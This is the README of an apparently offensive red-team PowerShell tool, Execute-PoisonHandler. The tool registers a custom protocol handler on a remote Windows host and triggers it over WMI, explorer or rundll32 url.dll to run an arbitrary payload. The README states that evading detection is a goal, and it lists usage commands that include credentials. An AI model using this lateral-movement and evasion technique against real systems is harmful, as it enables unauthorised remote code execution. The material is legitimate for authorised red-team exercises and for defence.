# PoisonHandler

lateral movement techniques that can be used during red team exercises.

# Execute-PoisonHandler.ps1

This technique is registering a protocol handler remotely and invoke it to execute arbitrary code on the remote host. The idea is to simply invoke `start handler://` to execute commands and evade detection.

This cmdlet create a protocol handler that will call your payload. Then execute it over `WMI` using `explorer.exe`.

the command that will be execute will look like the following one:

`cmd.exe /c start ms-browser://`

Where `ms-browser` is the custom handler you registered and will execute the payload you specified.

The default handler name is `ms-browser` but it can be set with the `-Handler` switch 

The handler can also be executed through `rundll32` using the following command `rundll32 url.dll,FileProtocolHandler`

```
Usage:

module-import .\Execute-PoisonHandler.ps1; Execute-PoisonHandler -ComputerName host -Payload "command to run"
module-import .\Execute-PoisonHandler.ps1; Execute-PoisonHandler -ComputerName host -Payload "command to run" -Handler ms-handler-name 
module-import .\Execute-PoisonHandler.ps1; Execute-PoisonHandler -ComputerName host -Payload "command to run" -Username MrUn1k0d3r -Password Password
module-import .\Execute-PoisonHandler.ps1; Execute-PoisonHandler -ComputerName host -Payload "command to run" -Username MrUn1k0d3r -Password Password -UseRunDLL32 True
module-import .\Execute-PoisonHandler.ps1; Execute-PoisonHandler -ComputerName host -Payload "command to run" -Username MrUn1k0d3r -Password Password -RemoteCommand "custom command to run the handler"
```

The `-RemoteCommand` switch can be used to specify the remote command used. the handler name will be appended at the end automatically.

# Command that can be used

* rundll32 url.dll,FileProtocolHandler
* rundll32 url.dll,OpenURL
* explorer
* start

# To do 
* add more way to execute the protocol handler

# Credit
Mr.Un1k0d3r RingZer0 Team

Tazz0 RingZer0 Team
